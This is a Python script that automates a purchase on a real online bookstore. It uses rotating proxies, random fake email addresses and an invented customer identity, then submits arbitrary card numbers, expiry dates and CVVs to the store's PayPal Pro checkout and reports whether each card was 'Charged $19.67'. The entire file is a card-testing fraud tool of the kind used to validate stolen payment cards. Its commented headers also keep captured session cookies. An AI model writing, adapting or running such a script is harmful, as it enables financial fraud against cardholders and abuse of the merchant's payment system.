import random,string,requests
from proxy import proxies

def getstr(data , start, end):
    try:
        start_index = data.index(start) + len(start)
        end_index = data.index(end, start_index)
        return data[start_index:end_index]
    except ValueError:
        return None
def genarate_email():
    domain = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    length = random.randint(8, 12)
    username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
    email = username + '@' + random.choice(domain)
    return email

async def payflow_charge2(cc, month, year, cvv):
    r = requests.Session()
    r.proxies = proxies()
    expire = f'{month} / {year[-2:]}'
    email = genarate_email()
    headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'ReaderBoundShop=1; eZSESSID=iceo4uoj15sfs5941iuv1v1ia4; _ga=GA1.1.988259071.1729238398; PrestaShop-c73326650d6ea686f77d941183fc6342=6TGXuInb7qWaRFclcx9hNkMJhQvqkAu5k6T20M6pJaJ8vHxzi%2F86cPtalW%2F9anhd0n6TGecrIIPLSToSb1Vx7qPllOSukBsHOhs%2BZzprvWSalWwNWReJkBRkYc4MjGEpeM6U4DYWfxg4xKDxhcGsgZ6qPFuWw9QTh1BpL5q19aJlTIx42pjWMQ4c3%2BHAuN6DsjX8lQ2Sfo9q8gp607ERv%2BQRYVslE7wAaMyNSp1TvPOEj4H4D0NSB4Yon4nB6DWyc7UKoSrekLmMyR5frV%2Ba%2FPWYshlI4cF7mzwW8cXLNNPyd25LHhvvt3RzZDgbpSJH000234; _ga_NZ3F1HHS1V=GS1.1.1729238397.1.1.1729238610.0.0.0',
            'Origin': 'https://arsenalpulp.com',
            'Pragma': 'no-cache',
            'Referer': 'https://arsenalpulp.com/Books/B/Blackbird',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    data = {
            'ref': '2347',
            'id_product': '408',
            'id_shop': '1',
            'qty': '1',
        }
    try:
            response = r.post('https://arsenalpulp.com/cart_add', headers=headers, data=data)
    except Exception as e:
            return 'Error in 1st Req '
    headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            # 'Cookie': 'ReaderBoundShop=1; eZSESSID=fbrnev0rqtf4548mff1rb8sdj0; _ga=GA1.1.1946912331.1729239736; _fbp=fb.1.1729239736564.546615072167547528; _ga_NZ3F1HHS1V=GS1.1.1729239736.1.0.1729239739.0.0.0; PrestaShop-c73326650d6ea686f77d941183fc6342=6TGXuInb7qWaRFclcx9hNn7Iiry%2FKAlRpe0Czb9jqMgYnqL2XthXgxf84kGX%2BzbLsVFouOMV0cOhrwzqbOO7TrnNacISQxnthein0lwwyWfMDTYp6HwbDeGp9%2BgPwV3h000089',
            'Pragma': 'no-cache',
            'Referer': 'https://arsenalpulp.com/Books/B/Blackbird',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }
    try:
            response = r.get('https://arsenalpulp.com/cart/en/quick-order', headers=headers)
            token = getstr(response.text, 'down&amp;token=', '"')
    except Exception as e:
            return 'Error in 2nd Req ' + str(e)
    headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'ReaderBoundShop=1; eZSESSID=fbrnev0rqtf4548mff1rb8sdj0; _ga=GA1.1.1946912331.1729239736; _fbp=fb.1.1729239736564.546615072167547528; PrestaShop-c73326650d6ea686f77d941183fc6342=6TGXuInb7qWaRFclcx9hNn7Iiry%2FKAlRpe0Czb9jqMgYnqL2XthXgxf84kGX%2BzbLsVFouOMV0cOhrwzqbOO7TrnNacISQxnthein0lwwyWfMDTYp6HwbDeGp9%2BgPwV3h000089; _ga_NZ3F1HHS1V=GS1.1.1729239736.1.0.1729239743.0.0.0',
            'Origin': 'https://arsenalpulp.com',
            'Pragma': 'no-cache',
            'Referer': 'https://arsenalpulp.com/cart/en/quick-order',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }

    params = {
            'rand': '1729240029642',
        }

    data = [
            ('ajax', 'true'),
            ('submitAccount', 'true'),
            ('is_new_customer', '0'),
            ('opc_id_customer', '0'),
            ('opc_id_address_delivery', '0'),
            ('opc_id_address_invoice', '0'),
            ('email', email),
            ('customer_firstname', 'Albedo'),
            ('customer_lastname', 'Jones'),
            ('firstname', 'Albedo'),
            ('lastname', 'Jones'),
            ('company', ''),
            ('address1', 'Hamilton'),
            ('city', 'Hamilton'),
            ('postcode', 'L8R 2L2'),
            ('alias', 'My address'),
            ('alias_invoice', 'My billing address'),
            ('id_state', '86'),
            ('id_country', '4'),
            ('customer_lastname', 'Jones'),
            ('customer_firstname', 'Albedo'),
            ('alias', 'My address'),
            ('other', ''),
            ('is_new_customer', '0'),
            ('token', token),
        ]
    try:
            response = r.post('https://arsenalpulp.com/cart/en/login', params=params, headers=headers, data=data)
    except Exception as e:
            return 'Error in 3rd Req ' + str(e)
    headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'ReaderBoundShop=1; eZSESSID=fbrnev0rqtf4548mff1rb8sdj0; _ga=GA1.1.1946912331.1729239736; _fbp=fb.1.1729239736564.546615072167547528; _ga_NZ3F1HHS1V=GS1.1.1729239736.1.0.1729239743.0.0.0; PrestaShop-c73326650d6ea686f77d941183fc6342=6TGXuInb7qWaRFclcx9hNn7Iiry%2FKAlRpe0Czb9jqMgYnqL2XthXgxf84kGX%2BzbLsVFouOMV0cOhrwzqbOO7TknBSRO%2Bde55cDN7Sl4Q1lj8ETSkdzGfzfLAeAQnX0mXAwKSzv09Y3ENkGdBsfHTyfsjLeygmwhPWMv1oN90haXFZuOESCs8qtXggVuBQwqmYWnDJER5OwJvj%2Fr5TQDP1sWty8RwdOJWK%2B1jC%2FGQBqCXs%2BQFfyzjv3Wyv8gPJTWde6yR9A6xzyayQ2RYoA%2FYVubblGgQY2VNuH2veGZRO35aIg50bKIHf1vJGBgrITvVSL8Qp%2BsQuVBC1vLUvibYfoZdZiqICiQ8gNUKFnwz5uwgk6K5vptIDgwfLNSDIWh4RgNPhsapwYFHm9%2B%2FAvFvE31NDHOVc99vCaF0Oix3X5CvCQrWYpxUKXNJUW2Jdb%2B4Yw4HfZ8r3HSsKIAXmp968A%3D%3D000349',
            'Origin': 'https://arsenalpulp.com',
            'Pragma': 'no-cache',
            'Referer': 'https://arsenalpulp.com/cart/en/quick-order',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }

    params = {
            'rand': '1729240031736',
        }

    data = {
            'allow_refresh': '1',
            'ajax': 'true',
            'method': 'updateAddressesSelected',
            'id_address_delivery': '17127',
            'id_address_invoice': '17127',
            'token': 'c39ea32b70e1ee7baec748a6e145dc2b',
        }
    try:
        response = r.post('https://arsenalpulp.com/cart/en/quick-order', params=params, headers=headers, data=data)
    except:
            return 'Error in 4th Req ' + str(e)
    headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'ReaderBoundShop=1; eZSESSID=fbrnev0rqtf4548mff1rb8sdj0; _ga=GA1.1.1946912331.1729239736; _fbp=fb.1.1729239736564.546615072167547528; _ga_NZ3F1HHS1V=GS1.1.1729239736.1.0.1729239743.0.0.0; PrestaShop-c73326650d6ea686f77d941183fc6342=6TGXuInb7qWaRFclcx9hNn7Iiry%2FKAlRpe0Czb9jqMgYnqL2XthXgxf84kGX%2BzbLsVFouOMV0cOhrwzqbOO7TknBSRO%2Bde55cDN7Sl4Q1lj8ETSkdzGfzfLAeAQnX0mXAwKSzv09Y3ENkGdBsfHTyfsjLeygmwhPWMv1oN90haXFZuOESCs8qtXggVuBQwqmYWnDJER5OwJvj%2Fr5TQDP1sWty8RwdOJWK%2B1jC%2FGQBqCXs%2BQFfyzjv3Wyv8gPJTWdn94SanW5xNJ25MRaY6pkdFmNzenmz0K6sQJmvu2JPDCM%2FEIhT5O%2F8tcbAKI5YCRQaezjcyqbiBz5ydVcpS%2FUyxtt3BDqwcPsBMdzhQ6hR8YZHnwAUPNBsrTbdpP3TVITRNGX2hX60C9SuzpCGJQayKUSC%2FkcE3%2BvkVS7Qctk3wMi3XhMUoquUOkLupDhdG9HjGWrtV8dVm286HYPkck4ViOTqROhPRUbdBJ7xOrKosGmKGMCmWgHIqZEir3tNCSA5cASb9NbamfwleqQOb94kS%2FdpDGtm5Vuo8rPv4CC17i9kX7xHmlD3tR7Fi7UWznxjI8V76Xo5cgKkPz1%2FryfYx%2FWtCmBsuj7%2BsUy%2BQ9Vq37ySal5GjpGJi6xeG6671xti81U1gHPgCtaqz8rbvAS1bZBuB%2FN2L66YbS%2B6Hvn3yTrkKrvzkbWNlSSEFDJFhwoUQyyHCZ9NH%2BAtwmjtvHMKA%3D%3D000535',
            'Origin': 'https://arsenalpulp.com',
            'Pragma': 'no-cache',
            'Referer': 'https://arsenalpulp.com/cart/en/quick-order',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    data = {
            'number': cc,
            'name': 'Albedo Jones',
            'expiry': expire,
            'cvc': cvv,
        }
    try:
            response = r.post(
                'https://arsenalpulp.com/cart/en/module/a4ppaypalpro/redirect',
                headers=headers,
                data=data,
            )
            resp = getstr(response.text, '<li>Paypal Error Message: ', '.</li>')
            if resp:
                return resp
            else:
                return 'Charged $19.67'
    except Exception as e:
            return 'Error in 5th Req'